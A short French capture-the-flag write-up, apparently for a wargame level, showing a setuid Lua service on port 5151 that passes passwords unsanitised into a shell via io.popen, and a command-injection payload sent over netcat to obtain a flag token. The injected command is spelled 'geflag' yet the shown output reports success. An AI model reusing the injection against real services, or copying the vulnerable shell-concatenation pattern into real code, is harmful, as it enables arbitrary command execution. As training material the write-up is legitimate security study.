## Démarche
- Dans le home se trouve un script lua
    `ls -la`
  > -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
    ```
    #!/usr/bin/env lua
    local socket = require("socket")
    local server = assert(socket.bind("127.0.0.1", 5151))

    function hash(pass)
    prog = io.popen("echo "..pass.." | sha1sum", "r")
    data = prog:read("*all")
    prog:close()

    data = string.sub(data, 1, 40)

    return data
    end


    while 1 do
    local client = server:accept()
    client:send("Password: ")
    client:settimeout(60)
    local l, err = client:receive()
    if not err then
        print("trying " .. l)
        local h = hash(l)

        if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
            client:send("Erf nope..\n");
        else
            client:send("Gz you dumb*\n")
        end

    end

    client:close()
    end
    ```

- À l'exécution, le script indique que l'adresse est déjà utilisée
  `./level11.lua`
    ```
    lua: ./level11.lua:3: address already in use
    stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
    ```

- `netstat` indique que le port `:5151` est ouvert :
  `netstat -tunl`
  ```
  Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State
    tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN
    tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN
    tcp6       0      0 :::4646                 :::*                    LISTEN
    tcp6       0      0 :::4747                 :::*                    LISTEN
    tcp6       0      0 :::80                   :::*                    LISTEN
    tcp6       0      0 :::4242                 :::*                    LISTEN
    udp        0      0 0.0.0.0:68              0.0.0.0:*
  ```

- Se connecter à ce port via `netcat`
    `nc localhost 5151`
    > Password:

- Le mot de passe saisi passe par cette ligne du script :
  `io.popen("echo "..pass.." | sha1sum")`
  Saisir les commandes sivantes en guise de mot de passe : 
  `1 && geflag > /tmp/flag`

- `cat /tmp/flag`
    > Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s



## Ressources
- [How to Check for Listening Ports in Linux](https://linuxize.com/post/check-listening-ports-linux/)
